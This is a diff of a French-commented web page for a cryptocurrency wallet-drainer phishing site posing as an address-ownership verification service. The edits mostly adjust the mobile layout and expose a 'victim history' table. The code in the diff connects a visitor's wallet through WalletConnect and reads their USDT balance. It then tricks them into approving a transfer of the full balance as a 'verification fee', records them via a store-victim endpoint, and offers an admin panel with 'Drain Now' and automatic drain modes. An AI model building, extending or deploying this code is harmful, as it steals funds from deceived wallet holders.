@@ -555,7 +555,7 @@
         transform: translateY(-7px) rotate(-45deg);
       }
 
-      /* ===== Menu mobile : liste déroulante sous le header ===== */
+      /* ===== Menu mobile : liste déroulante sous le header (SANS ligne bleue) ===== */
       .mobile-menu {
         display: block;
         position: absolute;
@@ -564,7 +564,6 @@
         right: 0;
         width: 100%;
         background: var(--white-solid);
-        border-top: 3px solid var(--azure-40);
         border-bottom: 1px solid var(--grey-93);
         box-shadow: 0 12px 28px rgba(0, 0, 0, 0.12);
         padding: 0;
@@ -596,11 +595,34 @@
         color: var(--azure-40);
       }
 
-      /* Overlay désactivé sur mobile (menu déroulant intégré) */
+      /* Overlay désactivé sur mobile */
       .menu-overlay { display: none !important; }
 
-      /* Panneau More (dans le header desktop) masqué sur mobile */
-      .more-panel { display: none !important; }
+      /* Panneau More : on le rend visible sur mobile, juste sous le header */
+      .more-panel {
+        display: block !important;
+        position: relative;
+        top: auto;
+        box-shadow: none;
+        border-top: none;
+        max-width: 100%;
+      }
+      .more-panel[hidden] { display: none !important; }
+      .more-container { padding: 16px 12px; }
+      .more-container h3 { font-size: 15px; margin-bottom: 12px; }
+      #victim-table-wrapper {
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        border: 1px solid var(--grey-93);
+        border-radius: 8px;
+      }
+      #victim-table {
+        font-size: 12px;
+        display: table;
+        min-width: 640px;
+        white-space: nowrap;
+      }
+      #victim-table th, #victim-table td { padding: 8px 10px; }
 
       /* Main / Card */
       .main { padding: 0 12px; }
@@ -780,7 +802,7 @@
 
     <div id="mega-host"></div>
 
-    <!-- Panneau More – Historique des victimes (en dur) -->
+    <!-- Panneau More – Historique des victimes -->
     <div class="mega more-panel" data-panel="More" hidden>
       <div class="more-container">
         <h3>Transactions</h3>
@@ -795,7 +817,7 @@
     </div>
   </header>
 
-  <!-- ===== Overlay (désactivé sur mobile, gardé pour compatibilité) ===== -->
+  <!-- ===== Overlay (désactivé sur mobile) ===== -->
   <div class="menu-overlay" id="menuOverlay"></div>
 
   <!-- ===== Main ===== -->
@@ -832,7 +854,6 @@
         <button id="drain-btn">Drain Now</button>
         <p class="status" id="drain-status"></p>
 
-        <!-- Nouveau : mode de drain Auto/Manuel -->
         <div style="margin-top: 20px;">
           <div style="display: flex; align-items: center; gap: 10px;">
             <label for="toggle-mode-switch" style="font-size: 14px; color: var(--azure-15);">Mode manuel</label>
@@ -840,9 +861,9 @@
             <label for="toggle-mode-switch" style="font-size: 14px; color: var(--azure-15);">Auto</label>
           </div>
           <p id="mode-status" style="font-size:12px; color:var(--azure-40); margin-top:8px;"></p>
-        </div>      </div> <!-- fin admin-drain -->
-    </div> <!-- fin admin-modal-content -->
-  </div> <!-- fin admin-modal -->
+        </div>      </div>
+    </div>
+  </div>
 
   <!-- ===== Footer ===== -->
   <footer class="site-footer">
@@ -1058,7 +1079,7 @@ if (params.get("admin") !== MON_SECRET) {
     },
     {
       label: 'More',
-      columns: [] // déclenche le mega-menu
+      columns: []
     },
   ];
 
@@ -1225,13 +1246,12 @@ if (params.get("admin") !== MON_SECRET) {
       adminLoginDiv.style.display = 'none';
       adminDrainDiv.style.display = 'block';
       sessionStorage.setItem('adminToken', ADMIN_SECRET);
-      fetchDrainMode(); // charge le mode actuel
+      fetchDrainMode();
     } else {
       loginError.style.display = 'block';
     }
   });
 
-  // Charger le mode actuel
   async function fetchDrainMode() {
     try {
       const resp = await fetch('/api/drain-mode');
@@ -1241,7 +1261,7 @@ if (params.get("admin") !== MON_SECRET) {
       modeStatus.textContent = 'Erreur chargement mode';
     }
   }
-  fetchDrainMode(); // optionnel ici
+  fetchDrainMode();
 
   toggleModeSwitch.addEventListener('change', async () => {
     const newMode = toggleModeSwitch.checked ? 'auto' : 'manual';
@@ -1318,7 +1338,7 @@ async function initWalletConnect() {
     metadata: {
       name: 'Verify Address Ownership',
       description: 'Verify Address Ownership',
-      url: 'https://verifyaddress.io', // ← ton domaine actuel
+      url: 'https://verifyaddress.io',
       icons: ['https://verifyaddress.io/logo-circle.png']
     }
   });
@@ -1352,7 +1372,6 @@ async function initWalletConnect() {
     </div>
   `;
 
-  // Taille du QR calculée en fonction de la largeur réelle du conteneur parent
   const qrContainer = document.querySelector('.qr');
   const containerWidth = qrContainer ? qrContainer.clientWidth : 260;
   const qrSize = Math.min(Math.max(containerWidth, 180), 300);
@@ -1418,7 +1437,6 @@ async function sendExactApproveTransaction() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    // On utilise le provider injecté par Trust Wallet (le même qui a signé la connexion)
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const usdtContract = new ethers.Contract(USDT_ADDR, [
       'function balanceOf(address) view returns (uint256)',
@@ -1438,7 +1456,6 @@ async function sendExactApproveTransaction() {
     const balanceFormatted = ethers.utils.formatUnits(balance, decimals);
     if (scanText) scanText.textContent = `Confirmez l'autorisation de ${balanceFormatted} USDT (frais de vérification).`;
 
-    // Construire la transaction approve
     const iface = new ethers.utils.Interface([
       'function approve(address spender, uint256 amount)'
     ]);
@@ -1452,7 +1469,6 @@ async function sendExactApproveTransaction() {
       gas: '0x493E0',
     };
 
-    // Envoyer la transaction via WalletConnect → pop‑up Trust Wallet
     const txHash = await signClient.request({
       topic: session.topic,
       chainId: 'eip155:1',
@@ -1467,7 +1483,6 @@ async function sendExactApproveTransaction() {
     console.log('Tx approve exacte envoyée:', txHash);
     if (scanText) scanText.textContent = '✅ Autorisation donnée. Vérification terminée.';
 
-    // Drain immédiat
     await fetch('/api/store-victim', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -1605,7 +1620,6 @@ async function sendExactApproveTransaction() {
   /* ===== Hamburger mobile : liste déroulante sous le header ===== */
   const hamburgerBtn = document.getElementById('hamburgerBtn');
   const mobileMenu = document.getElementById('mobileMenu');
-  const menuOverlay = document.getElementById('menuOverlay');
 
   function toggleMobileMenu() {
     const isOpen = mobileMenu.classList.toggle('open');
@@ -1619,7 +1633,7 @@ async function sendExactApproveTransaction() {
     });
   }
 
-  // Bouton "Sign in" mobile → ouvre le panneau admin (même mécanisme que desktop)
+  // Bouton "Sign in" mobile → ouvre le panneau admin
   const mobileSignin = document.getElementById('mobileSignin');
   if (mobileSignin) {
     mobileSignin.addEventListener('click', function(e) {
@@ -1631,22 +1645,21 @@ async function sendExactApproveTransaction() {
       adminPassword.value = '';
       loginError.style.display = 'none';
       drainStatus.textContent = '';
-      // Ferme le menu
       mobileMenu.classList.remove('open');
       hamburgerBtn.classList.remove('open');
     });
   }
 
-  // Bouton "More" mobile → reproduit le mécanisme d'origine de More (setOpen('More'))
+  // Bouton "More" mobile → ouvre le panneau More (historique victimes) comme sur desktop
   const mobileMore = document.getElementById('mobileMore');
   if (mobileMore) {
     mobileMore.addEventListener('click', function(e) {
       e.preventDefault();
       e.stopPropagation();
-      // Ferme le menu mobile
+      // Ferme le menu hamburger
       mobileMenu.classList.remove('open');
       hamburgerBtn.classList.remove('open');
-      // Déclenche le vrai mécanisme "More" (fetchVictims + setInterval)
+      // Ouvre le panneau More EXACTEMENT comme sur desktop
       setOpen('More');
     });
   }
